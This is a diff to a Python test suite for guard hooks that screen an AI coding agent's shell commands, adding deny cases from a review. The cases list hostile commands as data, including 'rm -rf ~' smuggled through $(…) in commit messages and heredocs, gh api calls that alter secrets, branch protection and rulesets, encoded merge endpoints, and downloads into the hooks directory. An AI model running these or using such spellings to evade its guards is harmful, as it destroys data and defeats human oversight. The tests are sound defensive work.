@@ -2196,6 +2196,7 @@ class MergeHookFailClosedTest(unittest.TestCase):
             ("pre-bash-guard.sh", {"tool_input": {"command": "gh pr merge 7 --disable-auto"}}, None),
             ("pre-mcp-guard.sh", off, None),
             ("pre-bash-guard.sh", {"tool_input": {"command": "gh pr view 7"}}, None),
+            ("pre-bash-guard.sh", {"tool_input": {"command": "gh pr merge 7 --admin --body '--disable-auto'"}}, "deny"),
         )
         for name, payload, want in cases:
             with self.subTest(nopy=payload):
@@ -3054,7 +3055,15 @@ class MissingGuardTest(unittest.TestCase):
             self.assertEqual(r.returncode, 0, r.stderr)
             return decision(r.stdout)
 
-        for cmd in ("git push origin main", "gh repo delete o/r --yes", "rm -rf ~", "ls; rm -rf ~", "echo hi"):
+        for cmd in (
+            "git push origin main",
+            "gh repo delete o/r --yes",
+            "rm -rf ~",
+            "ls; rm -rf ~",
+            "echo hi",
+            "python3 -c \"__import__('os').system('id')\" install.py",  # review #97
+            "git diff --output=/tmp/x",
+        ):
             with self.subTest(cmd):
                 self.assertEqual(dec(cmd), "deny")
         self.assertEqual(dec("echo hi", {"XT_GUARD_POLICY": "strict"}), "ask")
@@ -3186,6 +3195,139 @@ class GuardWave1017Test(unittest.TestCase):
                 "cat <<'E' | python3\nopen('.env','w').write('x')\nE",
                 "ls && python3 - <<'E'\nopen('.env','w').write('x')\nE",
             ),
+        )
+
+
+class GuardReview97Test(unittest.TestCase):
+    """Review #97: cờ toàn cục của gh trước `pr`, cờ giả rò sang lệnh git khác, graphql/REST merge viết lệch, `gh api`
+    đổi bí mật/quyền/ruleset, tải file vào thư mục hàng rào, `$(…)` trong nháy kép/heredoc không trích."""
+
+    @classmethod
+    def setUpClass(cls):
+        sys.path.insert(0, str(HOOKS))
+        import guard
+
+        cls.g = guard
+
+    def check(self, want: str, cmds: tuple[str, ...], hard: bool = True) -> None:
+        d = {"verdict": "human", "hard": ["auth"] if hard else [], "repo": "o/r", "head": "a", "autonomy": 3}
+        for cmd in cmds:
+            with (
+                self.subTest(cmd),
+                mock.patch.dict(os.environ, {"XT_GUARD_POLICY": ""}),
+                mock.patch.object(self.g, "merge_check", return_value=d),
+            ):
+                self.assertEqual(self.g.apply_policy(self.g.bash_decision(cmd, str(ROOT)))["decision"], want)
+
+    def test_gh_global_repo_flag_before_pr(self):
+        self.check(
+            "deny",
+            (
+                "gh -R o/r pr merge 7 --squash",
+                "gh --repo=o/r pr merge 7",
+                "gh -Ro/r pr merge 7 --auto",
+                "gh --repo o/r pr merge 7 --auto --squash",
+                "gh -R x/y pr merge 7",
+            ),
+        )
+        self.check("", ("gh -R o/r pr merge 7 --squash", "gh -R o/r pr view 7"), hard=False)
+
+    def test_push_config_flag_only_for_push(self):
+        self.check("deny", ("git -c push.default=current stash drop", "git -c push.default=matching stash clear"))
+        self.check(
+            "",
+            (
+                "git -c push.default=current push origin feat",
+                "git -c push.default=simple push",
+                "git -c remote.origin.push=HEAD:feat push origin feat",
+                "git push origin feat --force-if-includes",
+                "git config push.default simple",
+            ),
+        )
+        self.check(
+            "deny",
+            (
+                "git -c push.default=matching push",
+                "git -c remote.origin.push=HEAD:main push",
+                "git push origin heads/main",
+            ),
+        )
+
+    def test_api_merge_spelled_differently(self):
+        self.check(
+            "deny",
+            (
+                "gh api graphql -F query=@q.graphql",
+                "gh api graphql --input q.json",
+                'gh api graphql -f query="$Q"',
+                "gh api -X PUT 'repos/o/r/pulls/7/merge?x=1'",
+                "gh api -X PUT repos/o/r/pulls/7/%6Derge",
+            ),
+        )
+
+    def test_api_secrets_permissions_rulesets(self):
+        self.check(
+            "deny",
+            (
+                "gh api -X PUT repos/o/r/actions/secrets/X -f encrypted_value=x",
+                "gh api -X DELETE repos/o/r/actions/secrets/X",
+                "gh api -X PUT orgs/o/actions/secrets/X",
+                "gh api -X PUT repos/o/r/branches/main/protection --input p.json",
+                "gh api -X DELETE repos/o/r/branches/main/protection",
+                "gh api -X DELETE repos/o/r/rulesets/1",
+                "gh api -X POST repos/o/r/rulesets --input r.json",
+                "gh api -X DELETE repos/o/r/hooks/1",
+                "gh api -X PUT repos/o/r/collaborators/u",
+                "gh api -X POST repos/o/r/transfer -f new_owner=x",
+                "gh release delete v1 --yes",
+                "gh repo edit --visibility public",
+            ),
+            hard=False,
+        )
+        self.check(
+            "",
+            (
+                "gh api repos/o/r/rulesets",
+                "gh api -X POST repos/o/r/issues/7/labels -f labels[]=x",
+                "gh release view v1",
+                "gh api graphql -f query='query($n: Int!) { viewer { login } }' -F n=$N -f owner=$OWNER",
+            ),
+            hard=False,
+        )
+
+    def test_download_into_fence_dir(self):
+        self.check(
+            "deny",
+            (
+                "curl -O --output-dir .claude/hooks https://x.example.com/guard.py",
+                "curl --output-dir=.claude/hooks -O https://x.example.com/guard.py",
+                "wget -P .claude/hooks https://x.example.com/guard.py",
+                "wget --directory-prefix=.claude/hooks https://x.example.com/guard.py",
+            ),
+            hard=False,
+        )
+        self.check("", ("curl -O --output-dir build https://x.example.com/a.json",), hard=False)
+
+    def test_command_substitution_in_quotes_and_heredoc(self):
+        self.check(
+            "deny",
+            (
+                'git commit -m "$(rm -rf ~)"',
+                'echo "x $(git push --force origin main) y"',
+                "cat <<A\n$(rm -rf ~)\nA",
+                "cat <<A > n.md\n`rm -rf ~`\nA",
+            ),
+            hard=False,
+        )
+        self.check(
+            "",
+            (
+                "git commit -m 'literal $(rm -rf ~)'",
+                "cat <<'A' > n.md\n$(rm -rf ~)\nA",
+                'echo "$((1 + 2))"',
+                'git commit -m "$(cat msg.txt)"',
+            ),
+            hard=False,
         )
 
 
